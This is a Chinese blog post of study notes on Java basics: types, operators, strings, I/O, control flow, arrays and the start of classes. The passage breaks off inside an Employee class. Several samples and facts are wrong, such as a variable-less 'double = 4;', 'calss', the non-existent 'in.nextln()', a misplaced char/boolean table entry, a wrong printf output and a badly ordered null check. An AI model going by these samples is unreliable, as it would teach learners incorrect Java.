        <content type="html"><![CDATA[<p>仅阅读了Java基础部分，完结撒花<em>★,°</em>:.☆(￣▽￣)/$:<em>.°★</em></p><a id="more"></a><h2 id="第1章-Java程序设计概述"><a href="#第1章-Java程序设计概述" class="headerlink" title="第1章 Java程序设计概述"></a>第1章 Java程序设计概述</h2><h3 id="1-1-Java程序设计平台"><a href="#1-1-Java程序设计平台" class="headerlink" title="1.1 Java程序设计平台"></a>1.1 Java程序设计平台</h3><p>Java是一个完整的平台，提供了可移植性、垃圾回收、庞大的库、网络连接以及数据块存取等功能。</p><h3 id="1-2-Java“白皮书”的关键术语"><a href="#1-2-Java“白皮书”的关键术语" class="headerlink" title="1.2 Java“白皮书”的关键术语"></a>1.2 Java“白皮书”的关键术语</h3><p>关键术语：</p><p>1）简单性</p><p>2）面向对象</p><p>3）分布式</p><p>4）健壮性</p><p>5）安全性</p><p>6）体系结构中立</p><p>7）可移植性</p><p>8）解释型</p><p>9）高性能</p><p>10）多线程</p><p>11）动态性</p><h2 id="第2章-Java程序设计环境"><a href="#第2章-Java程序设计环境" class="headerlink" title="第2章 Java程序设计环境"></a>第2章 Java程序设计环境</h2><p>下载地址：<a href="http://www.oracle.com/technetwork/java/javase/downloads" target="_blank" rel="noopener">www.oracle.com/technetwork/java/javase/downloads</a></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211118140650.png" srcset="/img/loading.gif" lazyload="" alt="表2-1 Java术语"></p><p>接下来，Java SE会大量出现，相对于Java EE（Enterprise Edition）和Java ME（Micro Edition），它是Java的标准版。</p><h2 id="第3章-Java的基本程序设计结构"><a href="#第3章-Java的基本程序设计结构" class="headerlink" title="第3章 Java的基本程序设计结构"></a>第3章 Java的基本程序设计结构</h2><h3 id="3-1-一个简单的Java应用程序"><a href="#3-1-一个简单的Java应用程序" class="headerlink" title="3.1 一个简单的Java应用程序"></a>3.1 一个简单的Java应用程序</h3><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FirstSample</span> </span>{    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span><span class="hljs-function">    </span>{        System.out.println(<span class="hljs-string">"Hello World"</span>);    }}</code></pre></div><p>关键字<strong>public</strong>称为访问修饰符（accessmodifier），这些修饰符用于控制程序的其他部分对这段代码的访问级别。</p><p>关键字<strong>class</strong>表明Java程序中的全部内容都包含在类中，class后面是类名（文件名跟公共类名必须相同，即这个文件为<code>FirstSample.java</code>），此外<strong>Java区分大小写</strong></p><p>static void声明这个主程序的类型（Java的main方法必须是静态的，void也表示没有返回值），Java SE7 及之后的版本<strong>每个java程序都必须有一个main方法</strong></p><h3 id="3-2-注释"><a href="#3-2-注释" class="headerlink" title="3.2 注释"></a>3.2 注释</h3><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 单行注释</span><span class="hljs-comment">/*</span><span class="hljs-comment">多行注释</span><span class="hljs-comment">多行注释</span><span class="hljs-comment">*/</span></code></pre></div><h3 id="3-3-数据类型"><a href="#3-3-数据类型" class="headerlink" title="3.3 数据类型"></a>3.3 数据类型</h3><table><thead><tr><th>类型</th><th>存储占用</th><th>取值范围</th></tr></thead><tbody><tr><td>int</td><td>4字节</td><td>-2147483648 ~ 2147483647</td></tr><tr><td>short</td><td>2字节</td><td>-32768 ~ 32767</td></tr><tr><td>long</td><td>8字节</td><td></td></tr><tr><td>byte</td><td>1字节</td><td>-128 ~ 127</td></tr><tr><td>float</td><td>4字节</td><td></td></tr><tr><td>double</td><td>8字节</td><td></td></tr><tr><td>char</td><td></td><td>false 或 true</td></tr><tr><td>boolean</td><td></td><td></td></tr></tbody></table><h3 id="3-4-变量"><a href="#3-4-变量" class="headerlink" title="3.4 变量"></a>3.4 变量</h3><ul><li>变量声明</li></ul><p>变量声明示例：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> salary;<span class="hljs-comment">//注意：需要以分号结尾</span><span class="hljs-keyword">int</span> vacationDats;<span class="hljs-keyword">int</span> i,j;<span class="hljs-comment">//一行声明多个变量（不提倡）</span></code></pre></div><p>变量名必须是一个以字母开头并由字母或数字构成的序列</p><ul><li>初始化变量</li></ul><p>声明变量之后，需要初始化这个变量，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> i;i = <span class="hljs-number">1</span>;</code></pre></div><p>也可以写成：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>;</code></pre></div><ul><li>常量</li></ul><p>关键字final表示这个变量只能被赋值一次（习惯上，常量名使用全大写），例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">float</span> CM_PER_INCH = <span class="hljs-number">2.54</span>;</code></pre></div><h3 id="3-5-运算符"><a href="#3-5-运算符" class="headerlink" title="3.5 运算符"></a>3.5 运算符</h3><p><strong>+</strong>   ：加</p><p><strong>-</strong>    ：减</p><p>*****    ：乘</p><p><strong>/</strong>    ：除</p><h4 id="3-5-1-数学函数与常量"><a href="#3-5-1-数学函数与常量" class="headerlink" title="3.5.1 数学函数与常量"></a>3.5.1 数学函数与常量</h4><p>计算平方根：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> = <span class="hljs-number">4</span>;<span class="hljs-keyword">double</span> y = Math.sqrt(x);System.out.println(y);<span class="hljs-comment">//输出结果：2.0</span></code></pre></div><p>幂运算：</p><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">double</span> y = Math.<span class="hljs-built_in">pow</span>(x,a);<span class="hljs-comment">//x的a次幂</span></code></pre></div><p>此外Math类还提供了一些其他常用的函数：</p><div class="hljs code-wrapper"><pre><code class="hljs java">Math.sinMath.cosmath.tanMath.expMath.logMath.log10</code></pre></div><h4 id="3-5-2-数值类型之间的转换"><a href="#3-5-2-数值类型之间的转换" class="headerlink" title="3.5.2 数值类型之间的转换"></a>3.5.2 数值类型之间的转换</h4><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211118151550.png" srcset="/img/loading.gif" lazyload="" alt="数值类型之间的合法转换"></p><p>实心箭头：表示无信息丢失的转换；</p><p>虚箭头：表示可能有精度损失的转换。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211118151836.png" srcset="/img/loading.gif" lazyload="" alt=" int型转成 float型会丢失一定精度"></p><blockquote><p>当使用上面两个数值进行二元操作时（例如n + f, n是整数，f是浮点数），先要将两个操作数转换为同一种类型，然后再进行计算。</p><ul><li>如果两个操作数中有一个是double类型，另一个操作数就会转换为double类型。</li><li>否则，如果其中一个操作数是float类型，另一个操作数将会转换为float类型。</li><li>否则，如果其中一个操作数是long类型，另一个操作数将会转换为long类型。</li><li>否则，两个操作数都将被转换为int类型。</li></ul></blockquote><h4 id="3-5-3-强制类型转换"><a href="#3-5-3-强制类型转换" class="headerlink" title="3.5.3 强制类型转换"></a>3.5.3 强制类型转换</h4><p>int型可能会转换成 double型，但是也可以把double型强制转换为 int型，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> x = <span class="hljs-number">9.99</span>;<span class="hljs-keyword">int</span> nx = (<span class="hljs-keyword">int</span>)x;<span class="hljs-comment">//此时nx变为9</span><span class="hljs-keyword">int</span> nx = (<span class="hljs-keyword">int</span>)Math.round(x);<span class="hljs-comment">//此时nx变为10</span></code></pre></div><h4 id="3-5-4-结合赋值和运算符"><a href="#3-5-4-结合赋值和运算符" class="headerlink" title="3.5.4 结合赋值和运算符"></a>3.5.4 结合赋值和运算符</h4><p>可以在赋值中使用二元运算符来简化写法，例如</p><div class="hljs code-wrapper"><pre><code class="hljs java">x += <span class="hljs-number">4</span>;x = x + <span class="hljs-number">4</span>;<span class="hljs-comment">//上面两行语句是一样的</span></code></pre></div><h4 id="3-5-5-自增与自减运算符"><a href="#3-5-5-自增与自减运算符" class="headerlink" title="3.5.5 自增与自减运算符"></a>3.5.5 自增与自减运算符</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> n = <span class="hljs-number">12</span>;n++ ;<span class="hljs-comment">//n为13</span></code></pre></div><h4 id="3-5-6-关系和boolean运算符"><a href="#3-5-6-关系和boolean运算符" class="headerlink" title="3.5.6 关系和boolean运算符"></a>3.5.6 关系和boolean运算符</h4><p>3 == 7； //false<br>3 != 7； //true</p><h4 id="3-5-7-位运算符"><a href="#3-5-7-位运算符" class="headerlink" title="3.5.7 位运算符"></a>3.5.7 位运算符</h4><p><strong>&amp;</strong> ：and</p><p><strong>|</strong>   ：or</p><p><strong>^</strong>  ：xor</p><p><strong>~</strong>  ：not</p><h4 id="3-5-8-括号与运算符级别"><a href="#3-5-8-括号与运算符级别" class="headerlink" title="3.5.8 括号与运算符级别"></a>3.5.8 括号与运算符级别</h4><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211118152825.png" srcset="/img/loading.gif" lazyload="" alt="运算符优先级"></p><h4 id="3-5-9-枚举类型"><a href="#3-5-9-枚举类型" class="headerlink" title="3.5.9 枚举类型"></a>3.5.9 枚举类型</h4><p>有时候，变量的取值只在一个有限的集合内（比如衣服只有几种尺寸）。针对这种情况，可以自定义枚举类型。枚举类型包括有限个命名的值。例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> Size{SMALL,MEDIUM,LARGE,EXTRA_LARGE};</code></pre></div><p>现在，可以声明这种类型的变量：</p><div class="hljs code-wrapper"><pre><code class="hljs java">Size s = Size.MEDIUM;</code></pre></div><p>Size类型的变量只能存储这个类型声明中给定的某个枚举值，或者null值，null表示这个变量没有设置任何值。</p><h3 id="3-6-字符串"><a href="#3-6-字符串" class="headerlink" title="3.6 字符串"></a>3.6 字符串</h3><h4 id="3-6-1-子串"><a href="#3-6-1-子串" class="headerlink" title="3.6.1 子串"></a>3.6.1 子串</h4><p>String类的substring方法可以从一个较大的字符串提取出一个子串。例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java">String a = <span class="hljs-string">"Hello"</span>;String s = s.substring(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">//s是"Hel"</span></code></pre></div><p><code>s.substring(a, b)</code>表示字符串 s 取 a到 b，其字符长度为 b - a </p><h4 id="3-6-2-拼接"><a href="#3-6-2-拼接" class="headerlink" title="3.6.2 拼接"></a>3.6.2 拼接</h4><p>Java允许使用+号连接（拼接）两个字符串，例如</p><div class="hljs code-wrapper"><pre><code class="hljs java">String a = <span class="hljs-string">"Em"</span>;String b = <span class="hljs-string">"mmm"</span>;String c = a + b;</code></pre></div><h4 id="3-6-3-不可变字符串"><a href="#3-6-3-不可变字符串" class="headerlink" title="3.6.3 不可变字符串"></a>3.6.3 不可变字符串</h4><p>字符串的部分内容不可修改，比如”Hello”不能直接修改为”Help! “，但是可以通过拼接实现，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java">String a = <span class="hljs-string">"Hello"</span>String a = a.substring(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) + <span class="hljs-string">"p!"</span></code></pre></div><h4 id="3-6-4-检测字符串是否相等"><a href="#3-6-4-检测字符串是否相等" class="headerlink" title="3.6.4 检测字符串是否相等"></a>3.6.4 检测字符串是否相等</h4><p>可以使用equals方法检测两个字符串是否相等。对于表达式：</p><div class="hljs code-wrapper"><pre><code class="hljs java">s = <span class="hljs-string">"Hello"</span>t = <span class="hljs-string">"World"</span>s.equals(t)</code></pre></div><p>如果字符串s与字符串t相等，则返回true；否则，返回false。</p><p>上述也可以写成：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-string">"Hello"</span>.equals(<span class="hljs-string">"World"</span>)</code></pre></div><h4 id="3-6-5-空串与Null串"><a href="#3-6-5-空串与Null串" class="headerlink" title="3.6.5 空串与Null串"></a>3.6.5 空串与Null串</h4><p>空串是长度为0的字符串，检验：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(str.length()==<span class="hljs-number">0</span>)<span class="hljs-comment">//或</span><span class="hljs-keyword">if</span>(str.equals(<span class="hljs-string">""</span>))</code></pre></div><p>空串是一个Java对象，有自己的串长度（0）和内容（空）。而 <strong>null</strong> 表示目前没有任何对象与该变量关联，用以下语句判断：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(str == <span class="hljs-keyword">null</span>)</code></pre></div><p>检查一个字符串既不是null也不为空串：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(str.length() !=<span class="hljs-number">0</span>) &amp;&amp; str != <span class="hljs-keyword">null</span>)</code></pre></div><p>（因为显示问题，代码框中的 != 变成了<code>!=</code>，记住实际上是写<strong>!=</strong> ）</p><h4 id="3-6-6-码点与代码单元"><a href="#3-6-6-码点与代码单元" class="headerlink" title="3.6.6 码点与代码单元"></a>3.6.6 码点与代码单元</h4><div class="hljs code-wrapper"><pre><code class="hljs java">String a = <span class="hljs-string">"Hello"</span>;<span class="hljs-keyword">int</span> n = a.length(); <span class="hljs-comment">// n = 5</span><span class="hljs-keyword">char</span> b = a.charAt(<span class="hljs-number">0</span>);<span class="hljs-comment">// b = "H"</span></code></pre></div><h3 id="3-7-输入输出"><a href="#3-7-输入输出" class="headerlink" title="3.7 输入输出"></a>3.7 输入输出</h3><h4 id="3-7-1-读取输入"><a href="#3-7-1-读取输入" class="headerlink" title="3.7.1 读取输入"></a>3.7.1 读取输入</h4><p>要想通过控制台进行输入，首先需要构造一个Scanner对象，并与“标准输入流”System.in关联</p><div class="hljs code-wrapper"><pre><code class="hljs java">Scanner in = <span class="hljs-keyword">new</span> Scanner(System.in);</code></pre></div><p>现在，就可以使用Scanner类的各种方法实现输入操作了。例如，nextLine方法将输入一行</p><div class="hljs code-wrapper"><pre><code class="hljs java">System.out.println(<span class="hljs-string">"What is your name?"</span>);String name = in.nextLine();</code></pre></div><p>在这里，使用nextLine方法是因为在输入行中有可能包含空格。要想读取一个单词（以空白符作为分隔符），就调用</p><div class="hljs code-wrapper"><pre><code class="hljs java">String firstName = in.next();<span class="hljs-keyword">int</span> age = in.nextInt();<span class="hljs-comment">//读取整数</span></code></pre></div><h4 id="3-7-2-格式化输出"><a href="#3-7-2-格式化输出" class="headerlink" title="3.7.2 格式化输出"></a>3.7.2 格式化输出</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> x = <span class="hljs-number">10000.00</span>/<span class="hljs-number">3.0</span>;System.out.print(x);<span class="hljs-comment">//输出3333.3333333333335</span>System.out.printf(<span class="hljs-string">"%8.2f"</span>,x);<span class="hljs-comment">//表示8个字符的宽度和小数点后两位，输出3333.33</span>System.out.printf(<span class="hljs-string">"%.2f"</span>,<span class="hljs-number">10000.00</span>/<span class="hljs-number">3.0</span>);<span class="hljs-comment">//输出3,333.33</span>System.out.printf(<span class="hljs-string">"%tc"</span>,<span class="hljs-keyword">new</span> Date());<span class="hljs-comment">//打印当前日期和时间</span></code></pre></div><h4 id="3-7-3-文件输入与输出"><a href="#3-7-3-文件输入与输出" class="headerlink" title="3.7.3 文件输入与输出"></a>3.7.3 文件输入与输出</h4><div class="hljs code-wrapper"><pre><code class="hljs java">Scanner in = <span class="hljs-keyword">new</span> Scanner(Paths.get(<span class="hljs-string">"myfile.txt"</span>),<span class="hljs-string">"UTF-8"</span>);</code></pre></div><h3 id="3-8-控制流程"><a href="#3-8-控制流程" class="headerlink" title="3.8 控制流程"></a>3.8 控制流程</h3><h4 id="3-8-1-块作用域"><a href="#3-8-1-块作用域" class="headerlink" title="3.8.1 块作用域"></a>3.8.1 块作用域</h4><p>块（block）是指由一对大括号括起来的若干条简单的Java语句，块确定了变量的作用域</p><h4 id="3-8-2-条件语句"><a href="#3-8-2-条件语句" class="headerlink" title="3.8.2 条件语句"></a>3.8.2 条件语句</h4><p>条件语句格式：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(condition) statement<span class="hljs-comment">//或</span><span class="hljs-keyword">if</span>(condition) statement <span class="hljs-keyword">else</span> statement</code></pre></div><p>例如：</p><ul><li>case1</li></ul><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(yourSales &gt; target){performance = <span class="hljs-string">"Satisfactory"</span>;bonus = <span class="hljs-number">100</span>;}</code></pre></div><ul><li>case2</li></ul><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(yourSales &gt; target){performance = <span class="hljs-string">"Satisfactory"</span>;bonus =<span class="hljs-number">100</span>;}<span class="hljs-keyword">else</span>{performance = <span class="hljs-string">"UnSatisfactory"</span>;bonus = <span class="hljs-number">0</span>;}</code></pre></div><h4 id="3-8-3-while循环"><a href="#3-8-3-while循环" class="headerlink" title="3.8.3 while循环"></a>3.8.3 while循环</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">while</span>(condition) statement<span class="hljs-comment">//或</span><span class="hljs-function"><span class="hljs-keyword">do</span> statement <span class="hljs-title">while</span><span class="hljs-params">(condition)</span></span></code></pre></div><p>例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> i = <span class="hljs-number">10</span>;<span class="hljs-keyword">while</span>(i&gt;<span class="hljs-number">1</span>){    i = i - <span class="hljs-number">1</span>;}<span class="hljs-comment">// 或</span><span class="hljs-keyword">int</span> i = <span class="hljs-number">10</span>;<span class="hljs-keyword">do</span>{    i = i - <span class="hljs-number">1</span>;}<span class="hljs-keyword">while</span>(i&gt;<span class="hljs-number">1</span>)</code></pre></div><h4 id="3-8-4-for循环"><a href="#3-8-4-for循环" class="headerlink" title="3.8.4 for循环"></a>3.8.4 for循环</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">for</span>（<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)System.out.println(i);</code></pre></div><h4 id="3-8-5-多重选择：switch语句"><a href="#3-8-5-多重选择：switch语句" class="headerlink" title="3.8.5 多重选择：switch语句"></a>3.8.5 多重选择：switch语句</h4><div class="hljs code-wrapper"><pre><code class="hljs java">Scanner in = <span class="hljs-keyword">new</span> Scanner(System.in);System.out.print(<span class="hljs-string">"select an option (1,2)"</span>);<span class="hljs-keyword">int</span> choice = in.nextln();<span class="hljs-keyword">switch</span> (choice){    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:        ...        <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:        ...        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>:        ...        <span class="hljs-keyword">break</span>;}</code></pre></div><h4 id="3-8-6-中断控制流程语句"><a href="#3-8-6-中断控制流程语句" class="headerlink" title="3.8.6 中断控制流程语句"></a>3.8.6 中断控制流程语句</h4><ul><li>break：跳出该层循环（抵消掉整个for/while语句）</li><li>continue：跳过这一次循环（抵消掉for/while中的一次执行）</li></ul><h3 id="3-9-大数值"><a href="#3-9-大数值" class="headerlink" title="3.9 大数值"></a>3.9 大数值</h3><p>如果基本的整数和浮点数精度不能够满足需求，那么可以使用java.math包中的两个很有用的类：<strong>BigInteger</strong>（任意精度的整数运算）和<strong>BigDecimal</strong>（任意精度的浮点数运算）。</p><h3 id="3-10-数组"><a href="#3-10-数组" class="headerlink" title="3.10 数组"></a>3.10 数组</h3><p>声明数组（仅仅声明）：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] a;<span class="hljs-comment">// 也可以写成 int a[]</span></code></pre></div><p>（书上说Java程序员喜欢写第一种，我喜欢写成第二种）</p><p>声明并初始化数组：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] a =<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">100</span>];<span class="hljs-comment">//创建一个可以存储100个整数的数组</span></code></pre></div><h4 id="3-10-1-for-each循环"><a href="#3-10-1-for-each循环" class="headerlink" title="3.10.1 for each循环"></a>3.10.1 for each循环</h4><p>例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> element:a)System.out.println(element);</code></pre></div><p>这个循环读作“循环a中的每一个元素”（for each element in a），当然也可以用传统的for循环代替：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; a.length; i++)System.out.println(a[i]);</code></pre></div><h4 id="3-10-2-数组初始化以及匿名数组"><a href="#3-10-2-数组初始化以及匿名数组" class="headerlink" title="3.10.2 数组初始化以及匿名数组"></a>3.10.2 数组初始化以及匿名数组</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] smallPrimes = {<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>};</code></pre></div><p>这种写法不需要new，甚至还可以初始化一个匿名数组：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[] {<span class="hljs-number">17</span>,<span class="hljs-number">19</span>,<span class="hljs-number">23</span>,<span class="hljs-number">29</span>,<span class="hljs-number">31</span>,<span class="hljs-number">37</span>}</code></pre></div><p>（备注：匿名数组一般用在只用一次的时候）</p><h4 id="3-10-3-数组拷贝"><a href="#3-10-3-数组拷贝" class="headerlink" title="3.10.3 数组拷贝"></a>3.10.3 数组拷贝</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> [] luckyNumbers = smallPrimes;luckyNumbers[<span class="hljs-number">5</span>] = <span class="hljs-number">12</span>;</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211118181002.png" srcset="/img/loading.gif" lazyload="" alt="拷贝一个数组变量"></p><p>如果希望将一个数组的所有值拷贝到一个新的数组中去，就要使用Arrays类的copyOf方法：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] luckyNumbers2 = Arrays.copyOf(luckyNumbers,luckyNumbers.length);</code></pre></div><h4 id="3-10-5-数组排序"><a href="#3-10-5-数组排序" class="headerlink" title="3.10.5 数组排序"></a>3.10.5 数组排序</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">100</span>];Arrays.sort(a)</code></pre></div><h4 id="3-10-6-多维数组"><a href="#3-10-6-多维数组" class="headerlink" title="3.10.6 多维数组"></a>3.10.6 多维数组</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span>[][] a;a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">double</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];</code></pre></div><p>如果知道数组元素，就可以不调用new，而直接使用简化的书写形式对多维数组进行初始化。例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[][] magicSquare = {{<span class="hljs-number">16</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>},{<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>},{<span class="hljs-number">9</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>},{<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">1</span>}}</code></pre></div><p>（可以看出：Java实际上没有多维数组，只有一维数组。多维数组被解释为“数组的数组。）</p><h2 id="第4章-对象与类"><a href="#第4章-对象与类" class="headerlink" title="第4章 对象与类"></a>第4章 对象与类</h2><h3 id="4-1-面向对象程序设计概述"><a href="#4-1-面向对象程序设计概述" class="headerlink" title="4.1 面向对象程序设计概述"></a>4.1 面向对象程序设计概述</h3><ul><li>面向过程与面向对象的程序设计对比</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211118191554.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><h4 id="4-1-1-类"><a href="#4-1-1-类" class="headerlink" title="4.1.1 类"></a>4.1.1 类</h4><p>由类（class）构造（construct）对象的过程称为创建类的实例（instance）</p><p>封装（encapsulation，有时称为数据隐藏）是与对象有关的一个重要概念。从形式上看，封装是将数据和行为组合在一个包中，并对对象的使用者隐藏了数据的实现方式。</p><h4 id="4-1-2-对象"><a href="#4-1-2-对象" class="headerlink" title="4.1.2 对象"></a>4.1.2 对象</h4><p>要想使用面向对象程序设计（OOP），一定要清楚对象的三个主要特性：</p><ul><li>对象的行为（behavior）——可以对对象施加哪些操作，或可以对对象施加哪些方法？</li><li>对象的状态（state）——当施加那些方法时，对象如何响应？</li><li>对象标识（identity）——如何辨别具有相同行为与状态的不同对象？</li></ul><h4 id="4-1-3-识别类"><a href="#4-1-3-识别类" class="headerlink" title="4.1.3 识别类"></a>4.1.3 识别类</h4><p>识别类的简单规则是在分析问题的过程中寻找名词，而方法对应着动词。例如，在订单处理系统中，有这样一些名词：</p><ul><li>商品（Item）</li><li>订单（Order）</li><li>送货地址（Shipping address）</li><li>付款（Payment）</li><li>账户（Account）</li></ul><p>这些名词很可能成为类Item、Order等</p><h4 id="4-1-4-类之间的关系"><a href="#4-1-4-类之间的关系" class="headerlink" title="4.1.4 类之间的关系"></a>4.1.4 类之间的关系</h4><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211118194943.png" srcset="/img/loading.gif" lazyload="" alt="表达类关系的UML符号"></p><h3 id="4-2-使用预定义类"><a href="#4-2-使用预定义类" class="headerlink" title="4.2 使用预定义类"></a>4.2 使用预定义类</h3><p>在Java中，没有类就无法做任何事情</p><p>并不是所有的类都具有面些对象特征，例如Math类，在程序中可以使用Math类的方法Math.random</p><h4 id="4-2-1-对象与对象变量"><a href="#4-2-1-对象与对象变量" class="headerlink" title="4.2.1 对象与对象变量"></a>4.2.1 对象与对象变量</h4><p>在Java程序设计语言中，使用构造器（constructor）构造新实例。构造器是一种特殊的方法，用来构造并初始化对象。</p><p>在标准Java库中包含一个Date类。它的对象将描述一个时间点，例如：“December 31, 1999, 23:59:59GMT”。</p><p>构造器的名字应该与类名相同。因此Date类的构造器名为Date。要想构造一个Date对象，需要在构造器前面加上new操作符，如下所示：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> Date()</code></pre></div><p>这个表达式构造了一个新对象。这个对象被初始化为当前的日期和时间。</p><p>如果需要的话，也可以将这个对象传递给一个方法：</p><div class="hljs code-wrapper"><pre><code class="hljs java">System.out.println(<span class="hljs-keyword">new</span> Date())</code></pre></div><p>Date类中有一个toString方法。这个方法将返回日期的字符串描述：</p><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-keyword">new</span> Date().toString</code></pre></div><h4 id="4-2-2-Java类库中的LocalDate类"><a href="#4-2-2-Java类库中的LocalDate类" class="headerlink" title="4.2.2 Java类库中的LocalDate类"></a>4.2.2 Java类库中的LocalDate类</h4><p>不要使用构造器来构造LocalDate类的对象。实际上，应当使用静态工厂方法（factory method）代表你调用构造器。下面的表达式：</p><div class="hljs code-wrapper"><pre><code class="hljs java">LocalDate.now()</code></pre></div><p>会构造一个新对象，表示构造这个对象时的日期。</p><p>可以提供年、月和日来构造对应一个特定日期的对象：</p><div class="hljs code-wrapper"><pre><code class="hljs java">LocalDate.of(<span class="hljs-number">1999</span>,<span class="hljs-number">12</span>,<span class="hljs-number">31</span>)</code></pre></div><h4 id="4-2-3-更改器方法与访问器方法"><a href="#4-2-3-更改器方法与访问器方法" class="headerlink" title="4.2.3 更改器方法与访问器方法"></a>4.2.3 更改器方法与访问器方法</h4><div class="hljs code-wrapper"><pre><code class="hljs java">LocalDate aThousandDaysLater = newYearsEve.plusDays(<span class="hljs-number">1000</span>);</code></pre></div><p>newYearsEve日期没变化，aThousandDaysLater是newYearsEve的1000天之后</p><h3 id="4-3-用户自定义类"><a href="#4-3-用户自定义类" class="headerlink" title="4.3 用户自定义类"></a>4.3 用户自定义类</h3><h4 id="4-3-1-Employee类"><a href="#4-3-1-Employee类" class="headerlink" title="4.3.1 Employee类"></a>4.3.1 Employee类</h4><p>在Java中，最简单的类定义形式为：</p><div class="hljs code-wrapper"><pre><code class="hljs java">calss ClassName{    field_1    field_2    ...    constructor_1    constructor_2    ...    method_1    method_2}</code></pre></div><p>下面看一个非常简单的Employee类（在编写薪金管理系统时可能会用到）：</p><div class="hljs code-wrapper"><pre><code class="hljs java">Class Employee{    <span class="hljs-comment">// instance fields（所有的实例域）</span>    <span class="hljs-keyword">private</span> String name;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> salary;    <span class="hljs-keyword">private</span> LocalDate hireDay;        <span class="hljs-comment">// constructor（构造器）</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">(String n, <span class="hljs-keyword">double</span> s, <span class="hljs-keyword">int</span> year, <span class="hljs-keyword">int</span> month, <span class="hljs-keyword">int</span> day)</span></span><span class="hljs-function">    </span>{        